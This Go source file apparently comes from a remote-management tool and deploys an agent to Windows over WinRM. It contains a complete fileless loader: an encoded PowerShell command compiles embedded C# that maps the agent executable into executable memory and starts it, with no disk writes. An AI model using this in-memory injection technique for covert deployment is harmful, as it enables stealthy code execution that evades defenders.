package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strings"
	"unicode/utf16"
)

const winrmTransferChunkSize = 32 * 1024
const winrmTransferMaxSize = 128 * 1024 * 1024

// winrmTransfer describes the framed stdin payload sent to the receiver: the
// UTF-8 loader source followed by the agent executable. Both halves carry
// their own SHA-256 so the receiver never compiles or maps altered bytes.
// The receiver command line stays below the WinRS 8191-character limit
// because the loader travels as data, not as an encoded command parameter.
type winrmTransfer struct {
	source       io.Reader
	size         int64
	loaderSize   int64
	loaderDigest string
	binarySize   int64
	binaryDigest string
}

// prepareWinRMTransfer hashes the local executable before streaming it. A
// changed or truncated source fails the receiver's integrity check.
func prepareWinRMTransfer(source *os.File) (*winrmTransfer, error) {
	info, err := source.Stat()
	if err != nil {
		return nil, err
	}
	if !info.Mode().IsRegular() || info.Size() <= 0 || info.Size() > winrmTransferMaxSize {
		return nil, fmt.Errorf("WinRM agent must be a regular file between 1 and %d bytes", winrmTransferMaxSize)
	}
	hash := sha256.New()
	n, err := io.Copy(hash, io.LimitReader(source, winrmTransferMaxSize+1))
	if err != nil {
		return nil, err
	}
	if n != info.Size() {
		return nil, fmt.Errorf("WinRM local agent changed while hashing")
	}
	if _, err := source.Seek(0, io.SeekStart); err != nil {
		return nil, err
	}
	loader := []byte(winrmStage1CSharp)
	loaderDigest := sha256.Sum256(loader)
	return &winrmTransfer{
		source:       io.MultiReader(bytes.NewReader(loader), source),
		size:         int64(len(loader)) + n,
		loaderSize:   int64(len(loader)),
		loaderDigest: fmt.Sprintf("%x", loaderDigest),
		binarySize:   n,
		binaryDigest: fmt.Sprintf("%x", hash.Sum(nil)),
	}, nil
}

// winrmPowerShellLiteral quotes values as data rather than PowerShell syntax.
func winrmPowerShellLiteral(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "''") + "'"
}

// winrmEncodedCommand produces PowerShell's UTF-16LE EncodedCommand value.
func winrmEncodedCommand(script string) string {
	wide := utf16.Encode([]rune(script))
	data := make([]byte, 2*len(wide))
	for i, value := range wide {
		binary.LittleEndian.PutUint16(data[2*i:], value)
	}
	return base64.StdEncoding.EncodeToString(data)
}

// winrmStage1CSharp is the in-memory loader compiled inside the receiver by
// Add-Type. It must stay Windows PowerShell 5.1 compatible (C# 5): the
// CodeDom compiler used there rejects newer syntax. It travels as framed
// stdin data, so it never appears inside the receiver command line.
//
// The loader follows the classic injection pattern the operator requested:
// one VirtualAlloc(PAGE_EXECUTE_READWRITE) image, a copy of the received
// bytes mapped into it, then a detached CreateThread on the entry point.
// The copy step is a full PE32+ amd64 mapping because the Go agent is a PE,
// not raw shellcode: sections, base relocations, imports, and the TLS
// directory must be resolved before the entry point can run.
const winrmStage1CSharp = `
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
public static class L{
[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr z,uint s,uint t,uint p);
[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,IntPtr s,IntPtr e,IntPtr p,uint f,out uint i);
[DllImport("kernel32")]static extern uint ResumeThread(IntPtr h);
[DllImport("kernel32")]static extern uint WaitForSingleObject(IntPtr h,uint m);
[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);
[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr m,string n);
[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr m,IntPtr n);
[DllImport("ntdll")]static extern int NtQueryInformationThread(IntPtr h,int c,ref T i,int l,out int r);
struct T{public IntPtr a,b,c,d,e,f;}
static bool tlsReady;static uint tlsIndex;static IntPtr tlsData;
static ushort W(byte[]b,int o){return (ushort)(b[o]|b[o+1]<<8);}
static uint U(byte[]b,int o){return (uint)(b[o]|b[o+1]<<8|b[o+2]<<16|b[o+3]<<24);}
static ulong K(byte[]b,int o){ulong v=0;for(int i=7;i>=0;i--)v=v<<8|b[o+i];return v;}
static int Raw(byte[]b,int e,int os,uint rva){
int s=e+24+os;int n=W(b,e+6);
for(int i=0;i<n;i++,s+=40){
uint va=U(b,s+12),rs=U(b,s+16),ro=U(b,s+20);
if(rs>0&&rva>=va&&rva<va+rs)return (int)(ro+rva-va);}
return -1;}
static string Str(byte[]b,int o){
int n=o;while(n<b.Length&&b[n]!=0)n++;
return System.Text.Encoding.ASCII.GetString(b,o,n-o);}
public static void Setup(string session,string workspace){
Environment.SetEnvironmentVariable("RMM_SESSION_ID",session);
Environment.SetEnvironmentVariable("RMM_IN_MEMORY","1");
if(workspace!=null)Environment.SetEnvironmentVariable("RMM_AGENT_WORKSPACE_ID",workspace);}
public static byte[] Receive(System.IO.Stream s,long size,string digest){
byte[] b=new byte[size];long o=0;
while(o<size){int n=s.Read(b,(int)o,(int)(size-o));if(n<=0)throw new Exception("agent input is truncated");o+=n;}
if(s.ReadByte()!=-1)throw new Exception("agent input exceeds expected length");
string a;
using(var h=SHA256.Create())a=BitConverter.ToString(h.ComputeHash(b)).Replace("-","").ToLowerInvariant();
if(a!=digest)throw new Exception("agent SHA256 mismatch");
return b;}
static bool Reloc(byte[]b,int e,int os,IntPtr g,uint dir,uint dsz,long d){
if(dir==0||dsz==0)return false;
int o=Raw(b,e,os,dir);
if(o<0)return false;
long end=o+(long)dsz;
while(o+8<=end){
uint page=U(b,o),size=U(b,o+4);
if(size<8||o+(long)size>end)return false;
for(int i=8;i+2<=size;i+=2){
ushort t=W(b,o+i);
if((t>>12)==10){IntPtr p=new IntPtr(g.ToInt64()+page+(t&0xFFF));Marshal.WriteInt64(p,Marshal.ReadInt64(p)+d);}
else if((t>>12)!=0)return false;}
o+=(int)size;}
return true;}
static bool TLS(byte[]b,int e,int os,IntPtr g,uint dir){
if(dir==0)return true;
IntPtr td=new IntPtr(g.ToInt64()+dir);
long st=Marshal.ReadInt64(td),en=Marshal.ReadInt64(td,8),ix=Marshal.ReadInt64(td,16);
if(ix==0)return true;
tlsIndex=(uint)Marshal.ReadInt32(new IntPtr(ix));
if(tlsIndex>=64)return false;
long n=en-st;if(n<1)n=1;
tlsData=VirtualAlloc(IntPtr.Zero,(uint)n,0x3000,0x04);
if(tlsData==IntPtr.Zero)return false;
for(long i=0;i<n;i++)Marshal.WriteByte(new IntPtr(tlsData.ToInt64()+i),Marshal.ReadByte(new IntPtr(st+i)));
tlsReady=true;return true;}
static bool Imports(byte[]b,int e,int os,IntPtr g,uint dir){
if(dir==0)return true;
int o=Raw(b,e,os,dir);
if(o<0)return false;
for(int d=o;d+20<=b.Length;d+=20){
uint oft=U(b,d),nm=U(b,d+12),ft=U(b,d+16);
if(oft==0&&nm==0&&ft==0)break;
int no=Raw(b,e,os,nm);
if(no<0)return false;
IntPtr m=LoadLibraryA(Str(b,no));
if(m==IntPtr.Zero)return false;
uint walk=oft!=0?oft:ft;
for(int i=0;;i++){
int to=Raw(b,e,os,walk+(uint)(i*8));
if(to<0)return false;
ulong t=K(b,to);
if(t==0)break;
IntPtr p;
if((t>>63)==1)p=GetProcAddress(m,new IntPtr((long)(t&0xFFFF)));
else{int so=Raw(b,e,os,(uint)t);if(so<0)return false;p=GetProcAddress(m,Str(b,so+2));}
if(p==IntPtr.Zero)return false;
Marshal.WriteInt64(new IntPtr(g.ToInt64()+ft+(long)i*8),p.ToInt64());}}
return true;}
public static IntPtr Map(byte[]b){
int e=(int)U(b,0x3C);
if(e<64||U(b,e)!=0x4550||W(b,e+4)!=0x8664||W(b,e+24)!=0x20B)return IntPtr.Zero;
uint ep=U(b,e+40),sz=U(b,e+80),hd=U(b,e+84);
ushort ns=W(b,e+6),os=W(b,e+20);
if(hd>sz||(long)hd>b.Length)return IntPtr.Zero;
IntPtr g=VirtualAlloc(IntPtr.Zero,sz,0x3000,0x40);
if(g==IntPtr.Zero)return IntPtr.Zero;
Marshal.Copy(b,0,g,(int)hd);
long d=g.ToInt64()-(long)K(b,e+48);
int s=e+24+os;
for(int i=0;i<ns;i++,s+=40){
uint vs=U(b,s+8),va=U(b,s+12),rs=U(b,s+16),ro=U(b,s+20);
uint n=vs>0&&vs<rs?vs:rs;
if(va+n>sz)return IntPtr.Zero;
if(n>0)Marshal.Copy(b,(int)ro,new IntPtr(g.ToInt64()+va),(int)n);}
if(d!=0&&!Reloc(b,e,os,g,U(b,e+136+40),U(b,e+136+44),d))return IntPtr.Zero;
if(!TLS(b,e,os,g,U(b,e+136+72)))return IntPtr.Zero;
if(!Imports(b,e,os,g,U(b,e+136+8)))return IntPtr.Zero;
return new IntPtr(g.ToInt64()+ep);}
public static void Run(IntPtr entry){
uint tid;
IntPtr h=CreateThread(IntPtr.Zero,IntPtr.Zero,entry,IntPtr.Zero,4,out tid);
if(h==IntPtr.Zero)throw new Exception("agent thread creation failed");
if(tlsReady){
T i=new T();int r;
if(NtQueryInformationThread(h,0,ref i,Marshal.SizeOf(typeof(T)),out r)!=0)throw new Exception("thread query failed");
IntPtr a=Marshal.ReadIntPtr(i.b,0x58);
Marshal.WriteIntPtr(new IntPtr(a.ToInt64()+tlsIndex*8),tlsData);}
if(ResumeThread(h)==0xFFFFFFFF)throw new Exception("agent thread resume failed");
WaitForSingleObject(h,0xFFFFFFFF);}
}
`

// winrmStage1Script builds the receiver PowerShell payload. The receiver
// runs inside the WinRM shell job object, so the agent thread lives only as
// long as the shell: the script blocks forever on the agent thread and the
// source agent keeps the WinRM session open for the deployment's lifetime.
// Nothing is written to disk on the target: the loader source and the agent
// bytes stay in memory, and the mapped image is the only executable copy.
func winrmStage1Script(sessionID string, workspaceID *string, transfer *winrmTransfer) string {
	workspace := "$null"
	if workspaceID != nil {
		workspace = winrmPowerShellLiteral(*workspaceID)
	}
	return fmt.Sprintf(`$ErrorActionPreference='Stop'
$s=[Console]::OpenStandardInput()
$l=New-Object byte[] %d
$o=0
while($o -lt %d){$n=$s.Read($l,$o,%d-$o);if($n -le 0){throw 'loader input is truncated'};$o+=$n}
$h=[Security.Cryptography.SHA256]::Create()
try{$a=[BitConverter]::ToString($h.ComputeHash($l)).Replace('-','').ToLowerInvariant()}finally{$h.Dispose()}
if($a -ne %s){throw 'loader SHA256 mismatch'}
Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString($l))
[L]::Setup(%s,%s)
$b=[L]::Receive($s,%d,%s)
$e=[L]::Map($b)
if($e -eq [IntPtr]::Zero){throw 'agent image mapping failed'}
[L]::Run($e)`, transfer.loaderSize, transfer.loaderSize, transfer.loaderSize,
		winrmPowerShellLiteral(transfer.loaderDigest),
		winrmPowerShellLiteral(sessionID), workspace,
		transfer.binarySize, winrmPowerShellLiteral(transfer.binaryDigest))
}

// winrmReceiverArguments builds the shell command that runs the stage1
// receiver through Windows PowerShell.
func winrmReceiverArguments(sessionID string, workspaceID *string, transfer *winrmTransfer) []string {
	return []string{"-NoLogo", "-NoProfile", "-NonInteractive",
		"-EncodedCommand", winrmEncodedCommand(winrmStage1Script(sessionID, workspaceID, transfer))}
}

// winrmReceiverCommandPath is the target's Windows PowerShell interpreter.
const winrmReceiverCommandPath = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
